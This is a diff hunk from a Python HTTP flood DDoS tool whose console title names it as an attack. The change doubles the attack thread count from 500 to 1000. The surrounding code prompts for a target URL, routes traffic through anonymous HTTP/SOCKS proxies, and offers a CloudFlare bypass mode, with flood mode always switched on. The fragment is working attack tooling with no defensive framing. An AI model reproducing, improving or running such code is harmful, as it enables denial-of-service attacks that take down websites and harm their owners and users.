@@ -1402,7 +1402,7 @@ else:
                 os.system('title       ........::::: Code By TÙNG ĐẸP TRAI,HTTP FLOOD Ddos Attack :::::........')
             try:
                 url = input('[*] URL [https://domain.com]: ')
-                num_threads = int(500)
+                num_threads = int(1000)
                 choice = 'high anonymous http/https/sock4/sock5'
                 mode = input('[+] Phương Thức HttpFlood[Y]/ CloudFlare Bypass[]: ')
                 Flood_Mode = mode == 'Y' or True
